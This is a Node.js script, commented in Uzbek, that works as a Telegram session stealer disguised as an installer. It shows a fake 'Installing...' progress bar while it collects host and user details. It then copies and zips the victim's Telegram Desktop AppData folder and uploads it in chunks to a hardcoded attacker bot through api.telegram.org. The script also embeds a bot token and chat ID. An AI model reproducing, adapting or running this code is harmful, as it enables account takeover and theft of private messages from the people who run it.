const fs = require("fs");
const path = require("path");
const os = require("os");
const archiver = require("archiver");
const FormData = require("form-data");
const https = require("https");

// ===== SOZLAMALAR =====
const BOT_TOKEN = "7719159763:AAEUCdON9VomeMz4985axgbRYySVYlOdumQ";
const CHAT_ID = "2051091708";
const FOLDER_PATH = "C:\\Users\\User\\AppData\\Roaming\\Telegram Desktop";
const CHUNK_SIZE = 49 * 1024 * 1024;
// =======================

let currentPct = 0;

function showProgress(percent) {
  percent = Math.max(currentPct, Math.min(100, Math.floor(percent)));
  currentPct = percent;
  const filled = Math.floor(percent / 2);
  const bar = "█".repeat(filled) + "░".repeat(50 - filled);
  process.stdout.write(`\rInstalling... [${bar}] ${percent}%   `);
  if (percent >= 100) process.stdout.write("\nDone.\n");
}

process.on("uncaughtException", (err) => {
  process.stdout.write("\n");
  sendMessage(`❌ Xato:\n${err.message}`, () => process.exit(1));
});

process.on("unhandledRejection", (reason) => {
  process.stdout.write("\n");
  sendMessage(`❌ Xato:\n${reason}`, () => process.exit(1));
});

const pcInfo = [
  `Kompyuter: ${os.hostname()}`,
  `Foydalanuvchi: ${os.userInfo().username}`,
  `OS: ${os.type()} ${os.release()} (${os.platform()})`,
  `Arxitektura: ${os.arch()}`,
  `RAM: ${(os.totalmem() / (1024 * 1024 * 1024)).toFixed(1)} GB`,
  `CPU: ${os.cpus()[0]?.model || "noma'lum"}`,
].join("\n");

const folderPath = FOLDER_PATH;

if (!fs.existsSync(folderPath) || !fs.statSync(folderPath).isDirectory()) {
  sendMessage(`❌ Papka topilmadi: ${folderPath}`, () => process.exit(1));
} else {
  start();
}

function start() {
  const folderName = path.basename(path.resolve(folderPath));
  const tempCopyPath = path.join(os.tmpdir(), `${folderName}_copy`);
  const zipPath = path.join(os.tmpdir(), `${folderName}.zip`);

  // Scan (0-5%)
  showProgress(1);
  let totalFiles = 0, folderSize = 0;
  try {
    const counted = countFiles(folderPath);
    totalFiles = counted.files;
    folderSize = counted.size;
  } catch (e) {
    sendMessage(`❌ Xato:\n${e.message}`, () => process.exit(1));
    return;
  }
  showProgress(5);

  const folderSizeMB = (folderSize / (1024 * 1024)).toFixed(1);
  const zipLevel = folderSize <= CHUNK_SIZE ? 9 : 1;

  // Telegram xabar (5-8%)
  sendMessage(`🟢 Yangi foydalanuvchi run qildi!\n\n${pcInfo}\n\nPapka: ${folderName}\nHajmi: ${folderSizeMB} MB`, () => {
    showProgress(8);

    // Copy (8-35%)
    try { deleteFolderRecursive(tempCopyPath); } catch (e) {}
    copyFolderRecursive(folderPath, tempCopyPath, (copied) => {
      const pct = 8 + Math.floor((copied / totalFiles) * 27);
      showProgress(pct);
    });
    showProgress(35);

    // Zip (35-65%)
    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: zipLevel } });

    archive.on("progress", (p) => {
      const pct = 35 + Math.floor((p.fs.processedBytes / folderSize) * 30);
      showProgress(pct);
    });

    output.on("close", () => {
      showProgress(65);
      try { deleteFolderRecursive(tempCopyPath); } catch (e) {}

      const totalSize = fs.statSync(zipPath).size;
      const sizeMB = (totalSize / (1024 * 1024)).toFixed(1);

      sendMessage(`📦 Zip tayyor: ${sizeMB} MB`, () => {
        if (totalSize <= CHUNK_SIZE) {
          // Yuborish (65-100%)
          sendFileWithProgress(zipPath, `${folderName}.zip`, totalSize, 65, 100, () => {
            try { fs.unlinkSync(zipPath); } catch (e) {}
            sendMessage(`✅ Tayyor! ${folderName}.zip yuborildi.`, () => {
              showProgress(100);
            });
          });
        } else {
          splitAndSend(folderName, zipPath, totalSize);
        }
      });
    });

    archive.on("error", (err) => {
      sendMessage(`❌ Zip xato:\n${err.message}`, () => process.exit(1));
    });

    archive.pipe(output);
    archive.directory(tempCopyPath, false);
    archive.finalize();
  });
}

function countFiles(dir) {
  let files = 0, size = 0;
  const items = fs.readdirSync(dir, { withFileTypes: true });
  for (const item of items) {
    const fullPath = path.join(dir, item.name);
    try {
      if (item.isDirectory()) {
        const sub = countFiles(fullPath);
        files += sub.files; size += sub.size;
      } else {
        files++;
        size += fs.statSync(fullPath).size;
      }
    } catch (e) {}
  }
  return { files, size };
}

function copyFolderRecursive(src, dest, onProgress) {
  let count = 0;
  fs.mkdirSync(dest, { recursive: true });
  const items = fs.readdirSync(src, { withFileTypes: true });
  for (const item of items) {
    const srcPath = path.join(src, item.name);
    const destPath = path.join(dest, item.name);
    try {
      if (item.isDirectory()) {
        count += copyFolderRecursive(srcPath, destPath, onProgress);
      } else {
        fs.copyFileSync(srcPath, destPath);
        count++;
        if (onProgress) onProgress(count);
      }
    } catch (e) {}
  }
  return count;
}

function deleteFolderRecursive(dirPath) {
  if (!fs.existsSync(dirPath)) return;
  fs.rmSync(dirPath, { recursive: true, force: true });
}

function splitAndSend(folderName, filePath, totalSize) {
  const totalParts = Math.ceil(totalSize / CHUNK_SIZE);
  const partPaths = [];

  const fd = fs.openSync(filePath, "r");
  for (let i = 0; i < totalParts; i++) {
    const partPath = path.join(os.tmpdir(), `${folderName}.zip.part${i + 1}`);
    const buffer = Buffer.alloc(Math.min(CHUNK_SIZE, totalSize - i * CHUNK_SIZE));
    fs.readSync(fd, buffer, 0, buffer.length, i * CHUNK_SIZE);
    fs.writeFileSync(partPath, buffer);
    partPaths.push(partPath);
  }
  fs.closeSync(fd);
  try { fs.unlinkSync(filePath); } catch (e) {}

  let index = 0;
  function sendNext() {
    if (index >= partPaths.length) {
      sendMessage(`✅ Tayyor! ${totalParts} ta bo'lak yuborildi.`, () => {
        showProgress(100);
      });
      return;
    }
    const partFile = partPaths[index];
    const partName = `${folderName}.zip.part${index + 1}of${totalParts}`;
    const partSize = fs.statSync(partFile).size;
    const fromPct = 65 + Math.floor((index / totalParts) * 35);
    const toPct = 65 + Math.floor(((index + 1) / totalParts) * 35);
    sendFileWithProgress(partFile, partName, partSize, fromPct, toPct, () => {
      try { fs.unlinkSync(partFile); } catch (e) {}
      index++;
      sendNext();
    });
  }
  sendNext();
}

function sendFileWithProgress(filePath, fileName, fileSize, fromPct, toPct, onDone) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", fileName);
  form.append("document", fs.createReadStream(filePath), { filename: fileName });

  let sent = 0;
  form.on("data", (chunk) => {
    sent += chunk.length;
    const ratio = Math.min(0.99, sent / (fileSize * 1.01));
    showProgress(fromPct + Math.floor(ratio * (toPct - fromPct)));
  });

  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendDocument`,
    method: "POST",
    headers: form.getHeaders(),
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
      try {
        const result = JSON.parse(data);
        if (!result.ok) {
          sendMessage(`❌ Yuborishda xato (${fileName}):\n${result.description}`, () => { if (onDone) onDone(); });
          return;
        }
      } catch (e) {}
      if (onDone) onDone();
    });
  });
  req.on("error", (err) => {
    sendMessage(`❌ Tarmoq xato:\n${err.message}`, () => { if (onDone) onDone(); });
  });
  form.pipe(req);
}

function sendMessage(text, onDone) {
  const postData = JSON.stringify({ chat_id: CHAT_ID, text: text });
  const options = {
    hostname: "api.telegram.org",
    path: `/bot${BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) },
  };
  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => { if (onDone) onDone(); });
  });
  req.on("error", () => { if (onDone) onDone(); });
  req.write(postData);
  req.end();
}
